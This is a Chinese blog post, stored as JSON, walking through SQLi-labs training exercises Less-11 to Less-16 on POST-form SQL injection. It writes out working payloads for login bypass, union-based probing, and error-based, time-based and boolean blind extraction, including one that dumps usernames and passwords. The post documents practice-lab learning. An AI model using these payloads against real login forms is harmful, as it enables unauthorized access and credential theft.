{"title":"SQL注入-POST注入","uid":"32164fb6c436bfef89c97f001eea26bc","slug":"SQL注入-POST注入","date":"2022-02-05T01:25:13.000Z","updated":"2022-02-13T15:45:17.712Z","comments":true,"path":"api/articles/SQL注入-POST注入.json","keywords":null,"cover":[],"content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>[TOC]</p>\n<h2 id=\"0x00\"><a href=\"#0x00\" class=\"headerlink\" title=\"0x00\"></a>0x00</h2><p>POST注入，就是数据从客户端提交 到服务器端，例如我们在登录过程中，输入用户名和密码，用户名</p>\n<p>和密码以表单的形式提交， 提交到服务器后服务器再进行验证。这就是一次 post的过程。</p>\n<h2 id=\"Less-11\"><a href=\"#Less-11\" class=\"headerlink\" title=\"Less-11\"></a>Less-11</h2><p>当在输入框输入正确的用户名和密码后，显示登录成功</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5.htm/image-20220205092829849.png\" alt=\"image-20220205092829849\"></p>\n<h2 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h2><p>接下来就要探测注入点：</p>\n<p>当输入<code>admin&#39; --+ 123</code>,出现以下报错，可得知单引号报错；</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5.htm/image-20220205101856621.png\" alt=\"image-20220205101856621\"></p>\n<p>注入以下语句：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">admin&#39; or &#39;1&#39;&#x3D;&#39;1 --+\n123（密码随意）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>登录正常。</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5.htm/image-20220205102713002.png\" alt=\"image-20220205102713002\"></p>\n<h2 id=\"0x02\"><a href=\"#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h2><p>猜解字段数：</p>\n<p>执行以下语句：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">admin&#39; order by 3 #\nsss（密码随意）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>出现报错</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5.htm/image-20220205104619269.png\" alt=\"image-20220205104619269\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">admin&#39; order by 2 #\n123<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>登录正常，有两个字段</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5.htm/image-20220205104918157.png\" alt=\"image-20220205104918157\"></p>\n<h2 id=\"0x03\"><a href=\"#0x03\" class=\"headerlink\" title=\"0x03\"></a>0x03</h2><p>判断回显点：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">-admin&#39; union select 1,2#<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5.htm/image-20220205105159013.png\" alt=\"image-20220205105159013\"></p>\n<h2 id=\"0x04\"><a href=\"#0x04\" class=\"headerlink\" title=\"0x04\"></a>0x04</h2><p>爆库名：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">-admin&#39; union select 1,database() #<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5.htm/image-20220205105334082.png\" alt=\"image-20220205105334082\"></p>\n<p>后续注入同GET方式的payload。</p>\n<h2 id=\"Less-12\"><a href=\"#Less-12\" class=\"headerlink\" title=\"Less-12\"></a>Less-12</h2><p>输入<code>admin&quot;</code>出现报错，基于<code>&quot;)</code>的报错</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5.htm/image-20220205120713625.png\" alt=\"image-20220205120713625\"></p>\n<p>同样，类似Less-11探测注入点：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">uname&#x3D;admin&quot;) or 1&#x3D;1 #&amp;passwd&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>登录成功</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5.htm/image-20220205121017130.png\" alt=\"image-20220205121017130\"></p>\n<p>探测字段数：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">uname&#x3D;admin&quot;)  order by 2 #&amp;passwd&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5.htm/image-20220205121119677.png\" alt=\"image-20220205121119677\"></p>\n<p>探测回显点：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">uname&#x3D;-admin&quot;)  union select  1,2 #&amp;passwd&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>使用<code>union</code>字段一定要将开始查询的字段报错：<code>-admin&quot;)</code></p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5.htm/image-20220205121257596.png\" alt=\"image-20220205121257596\"></p>\n<p>后续过程同以往payload。</p>\n<h2 id=\"Less-13\"><a href=\"#Less-13\" class=\"headerlink\" title=\"Less-13\"></a>Less-13</h2><p>输入<code>admin&#39;</code>出现报错，基于<code>&#39;)</code>的报错</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5.htm/image-20220205121755152.png\" alt=\"image-20220205121755152\"></p>\n<p>探测注入点：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">uname&#x3D;admin&#39;) or 1&#x3D;1#&amp;passwd&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>登录成功，无回显。</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5.htm/image-20220205121951700.png\" alt=\"image-20220205121951700\"></p>\n<p>在探测回显点时，注入：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">uname&#x3D;admin&#39;)  union select 1,2#&amp;passwd&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>同样无回显：</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5.htm/image-20220205122814971.png\" alt=\"image-20220205122814971\"></p>\n<p>这时候首先想到的是盲注，先用报错盲注试验一下：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">uname&#x3D;admin&#39;)  and updatexml(1,concat(0x7e,(select database()),0x7e),1)#&amp;passwd&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>果然，爆出数据库。</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5.htm/image-20220205122717739.png\" alt=\"image-20220205122717739\"></p>\n<p>爆表名：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">uname&#x3D;admin&#39;)  and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),0x7e),1)#&amp;passwd&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5.htm/image-20220205123107133.png\" alt=\"image-20220205123107133\"></p>\n<p>爆字段：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">uname&#x3D;admin&#39;)  and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 4,1),0x7e),1)#&amp;passwd&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">uname&#x3D;admin&#39;)  and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 5,1),0x7e),1)#&amp;passwd&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>爆内容：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">uname&#x3D;admin&#39;)  and updatexml(1,concat(0x7e,(select concat(username,&#39;:&#39;,password) from users limit 0,1),0x7e),1)#&amp;passwd&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这里还可以使用其他的盲注进行测试。其他的payload见Less-5。</p>\n<h2 id=\"Less-14\"><a href=\"#Less-14\" class=\"headerlink\" title=\"Less-14\"></a>Less-14</h2><p>输入<code>admin&quot;</code>,报错，对id进行了<code>&quot;</code>处理</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5.htm/image-20220205123906183.png\" alt=\"image-20220205123906183\"></p>\n<p>探测注入点：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">uname&#x3D;admin&quot; or 1&#x3D;1 #&amp;passwd&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>登录成功，同样无回显。</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5.htm/image-20220205124221653.png\" alt=\"image-20220205124221653\"></p>\n<p>这里应该和Less-13一样，同样都是盲注：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">uname&#x3D;admin&quot; union select count(*),concat((select database()),floor(rand()*2)) a from information_schema.schemata  group by a #&amp;passwd&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>使用floor()函数报错，爆出数据库</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5.htm/image-20220205124636640.png\" alt=\"image-20220205124636640\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">uname&#x3D;admin&quot; or if(length(version())&gt;6, 1, sleep(5)) #&amp;passwd&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>时间盲注，猜测版本号，等待响应，版本号不大于6</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5.htm/image-20220205125050833.png\" alt=\"image-20220205125050833\"></p>\n<p>其他payload同以往。</p>\n<p>##Less-15</p>\n<p>输入<code>admin&#39;</code>登录失败 ，输入<code>admin&#39; or 1=1#</code>登录成功，但都无回显，无报错，结合源代码，这里对于id进行了<code>&#39;</code>处理，试验报错盲注，发现没有任何变化 ，而且还是登录失败的界面：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">uname&#x3D;admin&#39; or updatexml(1,concat(0x7e,select database(),0x7e),1)   #&amp;passwd&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5.htm/image-20220205130653538.png\" alt=\"image-20220205130653538\"></p>\n<p>报错盲注应该在这里不行，试试盲注。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">uname&#x3D;admin&#39; or if(length(version())&gt;5,1,sleep(5)) #&amp;passwd&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>时间盲注探测数据库版本，回显登录正确；</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5.htm/image-20220205130915677.png\" alt=\"image-20220205130915677\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">uname&#x3D;admin&#39; or ascii(substr(database(),1,1))&#x3D;115 #&amp;passwd&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>布尔盲注探测数据库第一位字符，回显登录正确。</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5.htm/image-20220205131312857.png\" alt=\"image-20220205131312857\"></p>\n<p>其他payload见以往。</p>\n<h2 id=\"Less-16\"><a href=\"#Less-16\" class=\"headerlink\" title=\"Less-16\"></a>Less-16</h2><p>根据源码，这里对id进行了<code>&quot;)</code>的处理，其他payload与Less-15相同。</p>\n","text":"[TOC] 0x00POST注入，就是数据从客户端提交 到服务器端，例如我们在登录过程中，输入用户名和密码，用户名 和密码以表单的形式提交， 提交到服务器后服务器再进行验证。这就是一次 post的过程。 Less-11当在输入框输入正确的用户名和密码后，显示登录成功 0x01接下...","link":"","photos":[],"count_time":{"symbolsCount":"2.8k","symbolsTime":"3 mins."},"categories":[{"name":"SQL注入","slug":"SQL注入","count":20,"path":"api/categories/SQL注入.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":21,"path":"api/tags/SQL注入.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x00\"><span class=\"toc-text\">0x00</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Less-11\"><span class=\"toc-text\">Less-11</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01\"><span class=\"toc-text\">0x01</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02\"><span class=\"toc-text\">0x02</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03\"><span class=\"toc-text\">0x03</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x04\"><span class=\"toc-text\">0x04</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Less-12\"><span class=\"toc-text\">Less-12</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Less-13\"><span class=\"toc-text\">Less-13</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Less-14\"><span class=\"toc-text\">Less-14</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Less-16\"><span class=\"toc-text\">Less-16</span></a></li></ol>","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"POST注入--基于Password的注入","uid":"9ed0d530657a494b586000f6c049b35e","slug":"POST注入-基于Password的注入","date":"2022-02-05T05:45:34.000Z","updated":"2022-02-13T15:41:34.276Z","comments":true,"path":"api/articles/POST注入-基于Password的注入.json","keywords":null,"cover":[],"text":"[TOC] Less-17说实话，看到的时候挺吃惊的，没见过，试了很多payload，都注不进去，它还嘲讽我： 0x01查了一下资料，又看了一下源码发现username已经不能被注入了，原因是源码将uname字段进行了检查，导致uname不能够构造payload进行注入。 （ch...","link":"","photos":[],"count_time":{"symbolsCount":962,"symbolsTime":"1 mins."},"categories":[{"name":"SQL注入","slug":"SQL注入","count":20,"path":"api/categories/SQL注入.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":21,"path":"api/tags/SQL注入.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"SQL注入-Less8-Less10","uid":"7e9ef5437654636a3aa94a45e71b7622","slug":"SQL注入-Less8-Less10","date":"2022-02-03T16:35:17.000Z","updated":"2022-02-13T15:42:39.833Z","comments":true,"path":"api/articles/SQL注入-Less8-Less10.json","keywords":null,"cover":[],"text":"[TOC] 0x00记录一下Less-8—Less10盲注遇到的一些问题 0x01首先8-10关最大特点就是没有报错回显，导致开始注入的时候都是利用报错注入，结果统统失败，后来查看源码发现，报错回显被注释掉了，那这几关报错盲注就不能用了，只能用布尔盲注和时间盲注。 0x02其次就...","link":"","photos":[],"count_time":{"symbolsCount":746,"symbolsTime":"1 mins."},"categories":[{"name":"SQL注入","slug":"SQL注入","count":20,"path":"api/categories/SQL注入.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":21,"path":"api/tags/SQL注入.json"},{"name":"靶场","slug":"靶场","count":12,"path":"api/tags/靶场.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}